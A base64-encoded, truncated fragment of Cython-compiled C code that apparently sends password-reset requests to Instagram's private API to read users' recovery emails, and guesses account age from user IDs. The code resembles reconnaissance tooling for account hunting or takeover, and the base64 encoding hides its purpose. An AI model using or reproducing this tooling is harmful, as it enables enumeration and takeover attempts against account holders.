ZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfTGVuZ3RoLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM1NikgPCAoMCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MCwgX19weXhfdl91c2VyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIwNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIwNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDIwOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIwOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfOSkpKSB7XG4gICAgICAgIF9fcHl4X3RfNyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOSk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzksIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTAgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjY307XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDIwOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEwLCAoMi1fX3B5eF90XzEwKSB8IChfX3B5eF90XzEwKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfNTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMCwgKDEtX19weXhfdF8xMCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjEwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjExLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19weXhfdl9yID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDtcbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5yZXN0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzQsICZfX3B5eF90XzUsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1JFU0VUX05BSElfSEFJX1NPSkEpO1xuICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1JFU0VUX05BSElfSEFJX1NPSkEpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgZ290byBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIF9fcHl4X0w4X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF92X3IpO1xuICBfX3B5eF9yID0gX19weXhfdl9yO1xuICBnb3RvIF9fcHl4X0wwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygianEucmVzdCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3IpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV83ZGF0ZShQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yanFfN2RhdGUgPSB7ImRhdGUiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJqcV83ZGF0ZSwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzdkYXRlKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfSWQgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJkYXRlICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JZCwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImRhdGUiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZGF0ZSIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3ZfSWQgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJkYXRlIiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLmRhdGUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yanFfNmRhdGUoX19weXhfc2VsZiwgX19weXhfdl9JZCk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV82ZGF0ZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9JZCkge1xuICBQeU9iamVjdCAqX19weXhfdl91aWQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBpbnQgX19weXhfdF81O1xuICBpbnQgX19weXhfdF82O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJkYXRlIiwgMCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl9JZCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3ZfdWlkID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIF9fcHl4X3ZfdWlkLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkge1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAwLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIyMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzUpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEwKTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEwO1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEyNzkwMDEsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkge1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNzc1MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIyMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90